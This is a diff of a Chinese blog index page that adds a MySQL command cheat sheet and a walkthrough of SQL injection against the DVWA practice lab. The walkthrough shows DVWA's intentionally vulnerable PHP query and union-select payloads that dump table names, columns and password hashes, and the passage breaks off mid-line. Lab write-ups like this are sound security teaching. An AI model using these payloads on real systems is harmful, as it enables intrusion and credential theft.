@@ -254,7 +254,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">26</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">27</span></a>
 
   </li>
         
@@ -273,7 +273,7 @@
       
     
 
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-分类"></i> <br>分类<span class="badge">10</span></a>
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-分类"></i> <br>分类<span class="badge">11</span></a>
 
   </li>
         
@@ -382,6 +382,422 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/常用SQL语句/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kawhi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/01/常用SQL语句/" class="post-title-link" itemprop="http://yoursite.com/index.html">常用SQL语句</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-01 19:37:16" itemprop="dateCreated datePublished" datetime="2019-03-01T19:37:16+08:00">2019-03-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-05 15:26:48" itemprop="dateModified" datetime="2019-03-05T15:26:48+08:00">2019-03-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#MySQL</span><br><span class="line">首先得配置mysql环境（phpstudy）</span><br><span class="line">然后命令行输入SQL语句，MySQL的SQL语句以分号(;)作为结束标识</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#MySQL常用命令</span><br><span class="line">mysql -u root -p           进入mysql</span><br><span class="line">Enter password:root        默认密码为root，可以修改</span><br><span class="line"></span><br><span class="line">show databases;            显示所有的数据库</span><br><span class="line">information_schema         mysql本身架构有关数据</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line"></span><br><span class="line">use information_schema;       </span><br><span class="line">选择要操作的MySQL数据库，使用该命令后所有MySQL命令都只针对该数据库</span><br><span class="line"></span><br><span class="line">show tables;         </span><br><span class="line">显示当前数据库中的所有表，使用该命令前需要使用use命令来选择要操作的数据库</span><br><span class="line">columns         </span><br><span class="line">存储用户创建的所有数据库的库名，表名和字段名，存放字段名的字段是column_name</span><br><span class="line">schemata        </span><br><span class="line">存储用户创建的所有数据库的库名，对应的字段名为schema_name</span><br><span class="line">tables          </span><br><span class="line">存储用户创建的所有数据库的库名和表名，对应的字段名为table_schema,table_name</span><br><span class="line"></span><br><span class="line">show columns from 数据表;       </span><br><span class="line">显示数据表的属性，属性类型，主键信息是否为NULL，默认值等其他信息</span><br><span class="line"></span><br><span class="line">show index from 数据表;          </span><br><span class="line">显示数据表的详细索引信息，包括PRIMARY KEY（主键）</span><br><span class="line"></span><br><span class="line">show table status like &apos;数据表&apos;;      </span><br><span class="line">该命令将输出MySQL数据库管理系统的性能及统计信息    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#select选择语句</span><br><span class="line">select * from schemata;        选择表中的全部可用字段</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;       </span><br><span class="line">显示某一表中的某一字段</span><br><span class="line">select schema_name from schemata;     </span><br><span class="line">当选择要操作的数据库后，该语句才可以选择相应字段</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema = &apos;mysql&apos;;</span><br><span class="line">显示某一数据库中的某一表中的某一字段		</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_schema=&apos;hyb&apos; and table_name = &apos;test&apos;;         </span><br><span class="line">显示某一数据库中的某一表的某一字段的记录</span><br><span class="line"></span><br><span class="line">select * from schemata limit m,n;         </span><br><span class="line">从表中第m+1条记录开始，取n条记录</span><br><span class="line"></span><br><span class="line">select * from schemata order by schemata_name asc;       </span><br><span class="line">输出表中的数据按照某一字段升序排序（desc是降序）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#union运算符</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line">UNION中的每个SELECT语句必须具有相同的列数</span><br><span class="line">这些列也必须具有相似的数据类型</span><br><span class="line">每个SELECT语句中的列也必须以相同的顺序排列</span><br><span class="line">默认情况下，UNION运算符选择一个不同的值。如果允许重复值，使用UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#注释</span><br><span class="line">单行注释 #   或者   --空格</span><br><span class="line">多行注释 /*   */</span><br><span class="line">扩展：/*!   */</span><br><span class="line">自MySQL3.23 版以来，可在C 风格的注释中“隐藏” MySQL特有的关键字，注释以“/!*”而不是以“/*”起头。MySQL查看这种特殊类型注释的内部并使用这些关键字，但其他数据库服务器将这些关键字作为注释的一部分忽略。这样有助于编写由MySQL执行时利用MySQL特有功能的代码，而且该代码也可以不用修改就用于其他数据库服务器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#函数</span><br><span class="line">database()        查看当前网站使用的数据库</span><br><span class="line">version()         查看当前MySQL的版本</span><br><span class="line">user()            查看当前MySQL的用户</span><br><span class="line">connection_id()   查看当前服务器的连接次数</span><br><span class="line">password()        对字符串（一般来自用户的密码）进行加密</span><br><span class="line">md5()             对字符串（一般是普通的数据）进行md5加密</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/SQL Injection of dvwa/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kawhi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/01/SQL Injection of dvwa/" class="post-title-link" itemprop="http://yoursite.com/index.html">SQL injection of dvwa</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-01 19:27:48" itemprop="dateCreated datePublished" datetime="2019-03-01T19:27:48+08:00">2019-03-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-05 15:34:44" itemprop="dateModified" datetime="2019-03-05T15:34:44+08:00">2019-03-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>靶场：dvwa<br>默认Username&amp;Password一共有五个：<br>admin/password<br>gordonb/abc123<br>1337/charley<br>pablo/letmein<br>smithy/password   </p>
+<p>手工注入思路：<br>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解SQL查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.下载数据    </p>
+<h2 id="Level：low"><a href="#Level：low" class="headerlink" title="Level：low"></a>Level：low</h2><h3 id="View-Source"><a href="#View-Source" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>从php源代码中可以看出该题没有设置任何过滤。  </p>
+</li>
+<li><p>后台的查询语句是<code>select first_name, last_name from users where user_id = &#39;$id&#39;;</code>，<code>$id</code>就是你在submit提交框内输入的内容，通过<code>$_GET</code>方法传递给后台服务器。    </p>
+</li>
+<li><p>mysql_qurry()：向指定的关联服务器中的当前活动数据库发送一条查询语句（不支持多条查询）。</p>
+</li>
+<li><p>mysql_numrows()：现在写法是mysql_num_rows()，返回结果集中行的数目，此命令仅对select语句有用。</p>
+</li>
+</ol>
+<h3 id="判断注入点及类型"><a href="#判断注入点及类型" class="headerlink" title="判断注入点及类型"></a>判断注入点及类型</h3><p>这题通过源代码可以知道存在字符型注入，但是在现实场景中是无法看到后端php代码的，所以需要我们通过盲注来推断存在何种注入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1</span></span><br><span class="line"> ID: 1</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1'</span></span><br><span class="line"> You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds</span><br><span class="line"> <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span></span><br><span class="line"> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''' at line 1</span></span><br><span class="line"><span class="string">注意返回的报错信息：''1'''</span>    ==&gt;    <span class="string">'    '</span>  <span class="number">1</span><span class="string">'   '</span>     <span class="string">'</span></span><br><span class="line"><span class="string">最外面一层单引号包含错误信息，里面的一层单引号告诉我们ID字段为字符型数据，</span></span><br><span class="line"><span class="string">最里面的1'</span>是我们的输入内容，由此可以判断这里存在单引号型注入</span><br></pre></td></tr></table></figure></p>
+<p>也可以采用and大法来判断<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1 and 1 = 1</span></span><br><span class="line"> ID: 1 and 1=1</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1 and 1 = 2</span></span><br><span class="line"> ID: 1 and 1=2</span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line">发现两者都能爆出数据，因而为字符型注入。</span><br></pre></td></tr></table></figure></p>
+<h3 id="猜测所查表中的字段数"><a href="#猜测所查表中的字段数" class="headerlink" title="猜测所查表中的字段数"></a>猜测所查表中的字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' or 1=1 order by 1#</span></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 1<span class="comment">#</span></span><br><span class="line"> First name: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' or 1=1 order by 2#</span></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: admin</span><br><span class="line"> Surname: admin</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"> ID: 1' or 1=1 order by 2<span class="comment">#</span></span><br><span class="line"> First name: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' or 1=1 order by 3#</span></span><br><span class="line">  Unknown column '3' in 'order clause'</span><br><span class="line">  说明此表中只有两个字段</span><br></pre></td></tr></table></figure>
+<p>也可以采用 union select 来猜测表中字段数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' union select 1#</span></span><br><span class="line"> The used <span class="keyword">SELECT</span> statements have a different <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">columns</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1' union select 1,2#</span></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,2#</span></span><br><span class="line"><span class="string"> First name: admin</span></span><br><span class="line"><span class="string"> Surname: admin</span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">第一次查询失败，第二次查询正确，说明有两个字段</span><br></pre></td></tr></table></figure></p>
+<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴库</span></span><br><span class="line"> 输入：1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,database()#</span></span><br><span class="line"><span class="string"> First name: admin</span></span><br><span class="line"><span class="string"> Surname: admin</span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: dvwa</span><br><span class="line"></span><br><span class="line"> 暴出数据库名：dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴表</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,table_name from information_schema.tables where table_schema = '</span>dvwa<span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'dvwa'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,table_name from information_schema.tables where table_schema = '</span>dvwa<span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: guestbook</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'dvwa'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"> 暴出了两个表：guestbook 和 <span class="keyword">users</span>，猜测有关用户名和密码存放在<span class="keyword">users</span>表中</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴字段</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">users</span><span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">user</span><span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: Host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">User</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,column_name from information_schema.columns where table_name = '</span><span class="keyword">user</span><span class="string">'#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: Password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'user'</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: Select_priv</span><br><span class="line"></span><br><span class="line"> 可以看到暴出了很多字段（这里只截取了一部分）：Host, <span class="keyword">User</span>, <span class="keyword">Password</span>, ···</span><br><span class="line"> 但是关键的还是<span class="keyword">User</span>和<span class="keyword">Password</span>字段</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴出User和Password字段内容</span></span><br><span class="line"> 输入：<span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: admin 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span 